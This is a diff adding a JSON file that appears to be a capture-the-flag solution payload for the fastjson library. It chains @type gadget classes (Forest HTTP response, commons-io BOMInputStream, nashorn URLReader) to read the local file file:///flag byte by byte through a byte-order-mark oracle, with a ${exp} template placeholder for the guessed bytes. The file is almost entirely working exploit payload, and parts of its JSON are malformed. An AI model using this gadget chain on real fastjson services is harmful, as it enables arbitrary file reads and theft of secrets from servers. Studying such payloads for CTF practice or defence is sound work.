@@ -1,0 +1,106 @@
+[{
+  "1ue": {
+    "@type": "java.lang.Exception",
+    "@type": "com.d3ctf.exceptions.ForestRespException"
+  }
+},
+  {
+    "2ue": {
+      "@type": "java.lang.Class",
+      "val": {
+        "@type": "com.alibaba.fastjson.JSONObject",
+  {
+    "@type": "java.lang.String"
+    "@type": "com.d3ctf.exceptions.ForestRespException",
+    "response": ""
+  }
+}
+},
+  {
+    "3ue": {
+      "@type": "com.dtflys.forest.http.ForestResponse",
+      "@type": "com.dtflys.forest.backend.httpclient.response.HttpclientForestResponse",
+      "entity": {
+        "@type": "org.apache.http.entity.AbstractHttpEntity",
+        "@type": "org.apache.http.entity.InputStreamEntity",
+        "inStream": {
+          "@type": "org.apache.commons.io.input.BOMInputStream",
+          "delegate": {
+            "@type": "org.apache.commons.io.input.ReaderInputStream",
+            "reader": {
+              "@type": "jdk.nashorn.api.scripting.URLReader",
+              "url": "file:///flag"
+            },
+            "charsetName": "UTF-8",
+            "bufferSize": 1024
+          },
+          "boms": [
+            {
+              "@type": "org.apache.commons.io.ByteOrderMark",
+              "charsetName": "UTF-8",
+              "bytes": [
+                ${exp}
+              ]
+            }
+          ]
+        }
+      }
+    }
+  },
+  {
+    "4ue": {
+      "$ref": "$[2].3ue.entity.inStream"
+    }
+  },
+  {
+    "5ue": {
+      "$ref": "$[3].4ue.bOM.bytes"
+    }
+  },
+  {
+    "6ue": {
+      "@type": "com.dtflys.forest.backend.httpclient.response.HttpclientForestResponse",
+      "entity": {
+        "@type": "org.apache.http.entity.InputStreamEntity",
+        "inStream": {
+          "@type": "org.apache.commons.io.input.BOMInputStream",
+          "delegate": {
+            "@type": "org.apache.commons.io.input.ReaderInputStream",
+            "reader": {
+              "@type": "org.apache.commons.io.input.CharSequenceReader",
+              "charSequence": {
+                "@type": "java.lang.String"
+  {
+    "$ref": "$[4].5ue"
+  },
+  "start"
+  :
+  0,
+  "end"
+  :
+  0
+  },
+  "charsetName"
+  :
+  "UTF-8",
+  "bufferSize"
+  :
+  1024
+  },
+  "boms"
+  :
+  [
+    {
+      "@type": "org.apache.commons.io.ByteOrderMark",
+      "charsetName": "UTF-8",
+      "bytes": [
+        1
+      ]
+    }
+  ]
+  }
+}
+
+}
+}
+]
